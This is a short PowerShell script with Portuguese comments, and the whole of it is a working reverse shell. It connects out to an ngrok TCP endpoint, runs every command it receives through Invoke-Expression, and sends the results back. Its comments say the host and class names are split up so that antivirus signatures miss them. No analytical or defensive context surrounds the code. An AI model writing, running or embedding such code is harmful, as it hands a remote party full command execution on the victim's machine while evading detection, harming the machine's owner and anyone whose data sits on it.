# Define o alvo e porta de forma dividida para evitar assinatura
$h = ('0' + '.tcp.sa.ngrok.io')
$p = 17512

# Cria o socket TCP
$c = New-Object ("System" + ".Net.Sockets.TCPClient") $h, $p
$s = $c.GetStream()

# Buffer para dados recebidos
[byte[]]$b = 0..1023 | % { 0 }

# Codificação ASCII
$e = [System.Text.Encoding]::ASCII

# Executa loop de leitura
while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
    $cmd = $e.GetString($b, 0, $r)
    try {
        $res = Invoke-Expression $cmd 2>&1 | Out-String
    } catch {
        $res = $_.Exception.Message
    }
    $res += "`nPS> " + (Get-Location).Path + "`n"
    $out = $e.GetBytes($res)
    $s.Write($out, 0, $out.Length)
}

# Encerra a conexão
$c.Close()
